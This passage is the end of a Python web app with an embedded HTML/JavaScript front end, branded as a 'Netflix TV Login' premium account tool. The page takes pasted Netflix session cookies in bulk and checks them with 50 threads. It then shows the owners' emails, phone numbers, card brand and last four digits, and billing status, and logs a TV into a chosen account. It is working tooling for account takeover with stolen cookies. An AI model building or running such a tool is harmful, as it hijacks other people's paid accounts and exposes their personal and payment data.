            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .card-header i {
            font-size: 2.5rem;
            color: #E50914;
            filter: drop-shadow(0 0 10px rgba(229, 9, 20, 0.5));
        }

        .card-header h2 {
            font-size: 1.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #fff 0%, #ccc 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .card-header p {
            color: #9ca3af;
            font-size: 0.95rem;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.75rem;
            color: #e5e7eb;
            font-weight: 500;
            font-size: 0.95rem;
        }

        textarea, input {
            width: 100%;
            padding: 1.2rem;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            color: #ffffff;
            font-family: 'Inter', monospace;
            font-size: 0.95rem;
            transition: all 0.3s;
        }

        textarea {
            min-height: 180px;
            resize: vertical;
        }

        textarea:focus, input:focus {
            outline: none;
            border-color: #E50914;
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 0 0 4px rgba(229, 9, 20, 0.1);
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
            padding: 1.2rem 2rem;
            border-radius: 40px;
            font-weight: 600;
            font-size: 1rem;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn-primary {
            background: linear-gradient(135deg, #E50914, #b20710);
            color: #ffffff;
            box-shadow: 0 10px 20px rgba(229, 9, 20, 0.3);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(229, 9, 20, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
        }

        .btn-secondary:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.15);
            transform: translateY(-2px);
        }

        /* Account Grid */
        .account-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 1.5rem;
            margin: 1.5rem 0;
        }

        .account-card {
            background: rgba(30, 30, 30, 0.6);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 1.5rem;
            transition: all 0.3s;
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }

        .account-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #E50914, #ff5e5e);
            transform: scaleX(0);
            transition: transform 0.3s;
        }

        .account-card:hover {
            transform: translateY(-4px);
            border-color: rgba(229, 9, 20, 0.3);
            box-shadow: 0 20px 30px rgba(0, 0, 0, 0.4);
        }

        .account-card:hover::before {
            transform: scaleX(1);
        }

        .account-card.selected {
            border-color: #E50914;
            background: rgba(229, 9, 20, 0.1);
            box-shadow: 0 0 30px rgba(229, 9, 20, 0.2);
        }

        .account-badge {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: linear-gradient(135deg, #E50914, #b20710);
            color: white;
            padding: 0.4rem 1rem;
            border-radius: 40px;
            font-size: 0.75rem;
            font-weight: 600;
            letter-spacing: 0.5px;
            box-shadow: 0 5px 10px rgba(229, 9, 20, 0.3);
        }

        .account-name {
            font-size: 1.4rem;
            font-weight: 700;
            margin-bottom: 1rem;
            padding-right: 5rem;
            background: linear-gradient(135deg, #fff, #e0e0e0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .account-detail {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 0.6rem;
            color: #d1d5db;
            font-size: 0.9rem;
        }

        .account-detail i {
            width: 20px;
            color: #E50914;
            font-size: 1rem;
        }

        .account-detail-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.5rem;
            margin-top: 1rem;
            padding-top: 1rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .account-stat {
            background: rgba(0, 0, 0, 0.3);
            padding: 0.5rem;
            border-radius: 12px;
            text-align: center;
        }

        .account-stat .label {
            color: #9ca3af;
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .account-stat .value {
            color: #E50914;
            font-weight: 600;
            font-size: 1rem;
        }

        /* TV Code Input */
        .tv-code-container {
            display: flex;
            gap: 1rem;
            align-items: center;
            justify-content: center;
        }

        .tv-code-input {
            width: 200px;
            text-align: center;
            font-size: 2rem;
            letter-spacing: 10px;
            font-weight: 700;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(229, 9, 20, 0.3);
            color: #E50914;
        }

        .tv-code-input:focus {
            border-color: #E50914;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
        }

        /* Alerts */
        .alert {
            padding: 1.2rem;
            border-radius: 20px;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid #10b981;
            color: #10b981;
            backdrop-filter: blur(10px);
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid #ef4444;
            color: #ef4444;
            backdrop-filter: blur(10px);
        }

        .alert-info {
            background: rgba(59, 130, 246, 0.15);
            border: 1px solid #3b82f6;
            color: #3b82f6;
            backdrop-filter: blur(10px);
        }

        .alert-honeypot {
            background: rgba(229, 9, 20, 0.2);
            border: 2px solid #E50914;
            color: #E50914;
            font-size: 1.2rem;
            font-weight: 600;
            text-align: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        /* Loading Spinner */
        .spinner {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Success Screen */
        .success-screen {
            text-align: center;
            padding: 3rem;
        }

        .success-screen i {
            font-size: 5rem;
            color: #10b981;
            margin-bottom: 1.5rem;
            filter: drop-shadow(0 0 20px rgba(16, 185, 129, 0.5));
            animation: scaleIn 0.5s ease;
        }

        @keyframes scaleIn {
            from {
                transform: scale(0);
            }
            to {
                transform: scale(1);
            }
        }

        .success-screen h2 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, #10b981, #34d399);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* Utilities */
        .hidden {
            display: none !important;
        }

        .mt-4 { margin-top: 1rem; }
        .mt-6 { margin-top: 1.5rem; }
        .flex { display: flex; }
        .gap-4 { gap: 1rem; }
        .text-center { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <i class="fab fa-netflix"></i>
                <span>TV LOGIN</span>
            </div>
            <p class="subtitle">Premium Account Management · 50 Threads · Real-time Validation</p>
            <div class="credit">
                <i class="fas fa-crown"></i>
                Made by <a href="https://t.me/still_alivenow" target="_blank">@still_alivenow</a>
            </div>
            <div class="rate-badge">
                <i class="fas fa-shield-alt"></i>
                5 requests/minute · 50 threads for checking
            </div>
        </div>

        <!-- Main Card -->
        <div class="main-card" id="mainCard">
            <!-- Step 1: Cookie Input -->
            <div id="step1Content">
                <div class="card-header">
                    <i class="fas fa-cookie-bite"></i>
                    <div>
                        <h2>Enter Netflix Cookies</h2>
                        <p>Paste cookies in any format · JSON · Netscape · Plain text</p>
                    </div>
                </div>

                <div class="form-group">
                    <textarea id="cookieInput" placeholder='Example:
{"name":"NetflixId","value":"abc123..."}
or
NetflixId=abc123...
or
.netflix.com TRUE / TRUE 1735689600 NetflixId abc123...'></textarea>
                </div>

                <div class="flex gap-4">
                    <button class="btn btn-primary" id="extractBtn" onclick="extractCookies()">
                        <i class="fas fa-magic"></i>
                        Extract & Validate
                    </button>
                    <button class="btn btn-secondary" id="clearBtn" onclick="clearAll()">
                        <i class="fas fa-trash"></i>
                        Clear
                    </button>
                </div>
            </div>

            <!-- Step 2: Account Selection -->
            <div id="step2Content" class="hidden">
                <div class="card-header">
                    <i class="fas fa-users-crown"></i>
                    <div>
                        <h2>Select Premium Account</h2>
                        <p>Choose an account for TV login · All details extracted</p>
                    </div>
                </div>

                <div id="accountList" class="account-grid"></div>

                <div class="flex gap-4 mt-4">
                    <button class="btn btn-secondary" onclick="goToStep1()">
                        <i class="fas fa-arrow-left"></i>
                        Back
                    </button>
                    <button class="btn btn-primary" id="proceedBtn" onclick="proceedToCode()" disabled>
                        <i class="fas fa-arrow-right"></i>
                        Continue to TV Login
                    </button>
                </div>
            </div>

            <!-- Step 3: TV Code -->
            <div id="step3Content" class="hidden">
                <div class="card-header">
                    <i class="fas fa-tv-alt"></i>
                    <div>
                        <h2>Enter TV Code</h2>
                        <p>Enter the 8-digit code shown on your TV screen</p>
                    </div>
                </div>

                <div class="form-group text-center">
                    <div class="tv-code-container">
                        <input type="text" class="tv-code-input" id="tvCode" maxlength="8" placeholder="••••••••" inputmode="numeric" pattern="[0-9]*">
                    </div>
                </div>

                <div class="flex gap-4">
                    <button class="btn btn-secondary" onclick="goToStep2()">
                        <i class="fas fa-arrow-left"></i>
                        Back
                    </button>
                    <button class="btn btn-primary" id="loginBtn" onclick="performLogin()">
                        <i class="fas fa-sign-in-alt"></i>
                        Login to TV
                    </button>
                </div>
            </div>

            <!-- Step 4: Success -->
            <div id="step4Content" class="hidden">
                <div class="success-screen">
                    <i class="fas fa-check-circle"></i>
                    <h2>Login Successful!</h2>
                    <p style="color: #9ca3af; margin-bottom: 2rem; font-size: 1.1rem;">Your TV is now connected to Netflix</p>
                    <button class="btn btn-primary" onclick="startNew()" style="width: auto; padding: 1rem 3rem;">
                        <i class="fas fa-redo"></i>
                        New Login
                    </button>
                </div>
            </div>

            <!-- Alerts -->
            <div id="alertContainer" class="mt-4"></div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        let selectedAccount = null;
        let sessionId = null;
        let allAccounts = [];

        function showAlert(type, message, timeout = 5000) {
            const container = document.getElementById('alertContainer');
            const alert = document.createElement('div');
            alert.className = `alert alert-${type}`;
            alert.innerHTML = `
                <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : type === 'honeypot' ? 'fa-skull-crossbones' : 'fa-info-circle'}"></i>
                <span>${message}</span>
            `;
            
            container.innerHTML = '';
            container.appendChild(alert);
            
            if (timeout > 0) {
                setTimeout(() => alert.remove(), timeout);
            }
        }

        function setLoading(buttonId, isLoading) {
            const btn = document.getElementById(buttonId);
            if (!btn) return;
            btn.disabled = isLoading;
            if (isLoading) {
                btn.innerHTML = '<i class="fas fa-spinner spinner"></i> Processing...';
            } else {
                btn.innerHTML = btn.getAttribute('data-original') || btn.innerHTML;
            }
        }

        function updateSteps() {
            for (let i = 1; i <= 4; i++) {
                const content = document.getElementById(`step${i}Content`);
                if (i === currentStep) {
                    content.classList.remove('hidden');
                } else {
                    content.classList.add('hidden');
                }
            }
        }

        async function extractCookies() {
            const cookieInput = document.getElementById('cookieInput').value.trim();
            
            if (!cookieInput) {
                showAlert('error', 'Please paste your cookies first');
                return;
            }

            setLoading('extractBtn', true);
            showAlert('info', 'Extracting cookies...', 0);

            try {
                const response = await fetch('/api/extract', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: cookieInput })
                });

                if (response.status === 429) {
                    const data = await response.json();
                    if (data.honeypot) {
                        showAlert('honeypot', '🤖 ' + data.message, 10000);
                        return;
                    }
                }

                const data = await response.json();

                if (data.success) {
                    if (data.count > 0) {
                        showAlert('success', `Found ${data.count} cookie(s). Checking with 50 threads...`);
                        await checkCookies(data.netflix_ids);
                    } else {
                        showAlert('error', 'No Netflix cookies found');
                    }
                } else {
                    showAlert('error', data.error || 'Extraction failed');
                }
            } catch (error) {
                showAlert('error', 'Request failed');
            } finally {
                setLoading('extractBtn', false);
            }
        }

        async function checkCookies(encryptedIds) {
            setLoading('extractBtn', true);

            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ netflix_ids: encryptedIds })
                });

                if (response.status === 429) {
                    const data = await response.json();
                    if (data.honeypot) {
                        showAlert('honeypot', '🤖 ' + data.message, 10000);
                        return;
                    }
                }

                const data = await response.json();

                if (data.success) {
                    const validAccounts = data.results.filter(r => r.valid);
                    
                    if (validAccounts.length > 0) {
                        allAccounts = validAccounts;
                        sessionId = data.session_id;
                        displayAccounts(validAccounts);
                        currentStep = 2;
                        updateSteps();
                        showAlert('success', `Found ${validAccounts.length} valid premium account(s)`);
                    } else {
                        showAlert('error', 'No valid accounts found');
                    }
                } else {
                    showAlert('error', data.error || 'Check failed');
                }
            } catch (error) {
                showAlert('error', 'Request failed');
            } finally {
                setLoading('extractBtn', false);
            }
        }

        function displayAccounts(accounts) {
            const container = document.getElementById('accountList');
            container.innerHTML = '';
            
            accounts.forEach((account, index) => {
                const card = document.createElement('div');
                card.className = `account-card ${index === 0 ? 'selected' : ''}`;
                card.onclick = () => selectAccount(index);
                card.setAttribute('data-index', index);
                
                let badge = '';
                if (account.premium) {
                    badge = '<span class="account-badge"><i class="fas fa-crown"></i> PREMIUM</span>';
                }
                
                card.innerHTML = badge + `
                    <div class="account-name">${account.name || 'Unknown'}</div>
                    
                    <div class="account-detail">
                        <i class="fas fa-envelope"></i>
                        <span>${account.email || 'Unknown'}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-globe"></i>
                        <span>${account.country || 'Unknown'}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-tag"></i>
                        <span>${account.plan || 'Unknown'} · ${account.plan_price || ''}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-video"></i>
                        <span>${account.video_quality || 'Unknown'} · ${account.max_streams || '?'} streams</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-calendar"></i>
                        <span>Member: ${account.member_since || 'Unknown'}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-credit-card"></i>
                        <span>${account.payment_method || 'Unknown'} · ${account.card_brand || ''} · ${account.last4 || ''}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-phone"></i>
                        <span>${account.phone || 'No phone'} · ${account.phone_verified || ''}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-envelope-open-text"></i>
                        <span>Email verified: ${account.email_verified || 'Unknown'}</span>
                    </div>
                    
                    <div class="account-detail">
                        <i class="fas fa-users"></i>
                        <span>${account.profiles_count || 0} profiles · ${account.profiles || 'No profiles'}</span>
                    </div>
                    
                    <div class="account-detail-grid">
                        <div class="account-stat">
                            <div class="label">Next Billing</div>
                            <div class="value">${account.next_billing || 'Unknown'}</div>
                        </div>
                        <div class="account-stat">
                            <div class="label">Status</div>
                            <div class="value">${account.membership_status || 'Unknown'}</div>
                        </div>
                        <div class="account-stat">
                            <div class="label">Payment Hold</div>
                            <div class="value">${account.payment_hold || 'No'}</div>
                        </div>
                        <div class="account-stat">
                            <div class="label">Extra Member</div>
                            <div class="value">${account.extra_member || 'No'}</div>
                        </div>
                    </div>
                `;
                
                container.appendChild(card);
            });
            
            selectedAccount = accounts[0];
            document.getElementById('proceedBtn').disabled = false;
        }

        function selectAccount(index) {
            document.querySelectorAll('.account-card').forEach(card => {
                card.classList.remove('selected');
            });
            document.querySelector(`.account-card[data-index="${index}"]`).classList.add('selected');
            selectedAccount = allAccounts[index];
            document.getElementById('proceedBtn').disabled = false;
        }

        function goToStep1() {
            currentStep = 1;
            updateSteps();
        }

        function goToStep2() {
            if (allAccounts.length > 0) {
                currentStep = 2;
                updateSteps();
            }
        }

        function proceedToCode() {
            if (!selectedAccount) return;
            currentStep = 3;
            updateSteps();
            document.getElementById('tvCode').focus();
        }

        async function performLogin() {
            const tvCode = document.getElementById('tvCode').value.trim();
            
            if (!tvCode || !/^\\d{8}$/.test(tvCode)) {
                showAlert('error', 'Please enter a valid 8-digit code');
                return;
            }

            setLoading('loginBtn', true);
            showAlert('info', 'Logging into TV...', 0);

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        encrypted_id: selectedAccount.encrypted_id,
                        tv_code: tvCode,
                        session_id: sessionId
                    })
                });

                if (response.status === 429) {
                    const data = await response.json();
                    if (data.honeypot) {
                        showAlert('honeypot', '🤖 ' + data.message, 10000);
                        return;
                    }
                }

                const data = await response.json();

                if (data.success) {
                    currentStep = 4;
                    updateSteps();
                    showAlert('success', '✅ Login successful!');
                } else {
                    showAlert('error', data.message || 'Login failed');
                }
            } catch (error) {
                showAlert('error', 'Login request failed');
            } finally {
                setLoading('loginBtn', false);
            }
        }

        function clearAll() {
            document.getElementById('cookieInput').value = '';
            document.getElementById('tvCode').value = '';
            selectedAccount = null;
            sessionId = null;
            allAccounts = [];
            currentStep = 1;
            updateSteps();
        }

        function startNew() {
            clearAll();
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            updateSteps();
            document.getElementById('cookieInput').focus();
            
            // Save original button text
            document.querySelectorAll('.btn').forEach(btn => {
                btn.setAttribute('data-original', btn.innerHTML);
            });
        });
    </script>
</body>
</html>
'''

# -------------------------------------------------------------------
# START
# -------------------------------------------------------------------

if __name__ == "__main__":
    import asyncio
    port = int(os.environ.get("PORT", 8080))
    
    print("=" * 70)
    print("🎬 NETFLIX TV LOGIN - PREMIUM ACCOUNT TOOL")
    print("=" * 70)
    print(f"🔥 Rate limit: {RATE_LIMIT} requests per {RATE_WINDOW} seconds")
    print(f"🔥 Thread pool: 50 threads for cookie checking")
    print(f"🔥 Honeypot responses: {len(HONEYPOT_RESPONSES)} vulgar phrases")
    print(f"🔥 Encryption: AES-256-GCM with 1-hour expiry")
    print(f"🔥 Lockout: {MAX_LOGIN_ATTEMPTS} fails = {LOCKOUT_TIME//60}min ban")
    print("=" * 70)
    print(f"🚀 Server: http://0.0.0.0:{port}")
    print(f"👤 Owner: @still_alivenow")
    print("=" * 70)
    
    app.run(host="0.0.0.0", port=port, debug=True, threaded=True)
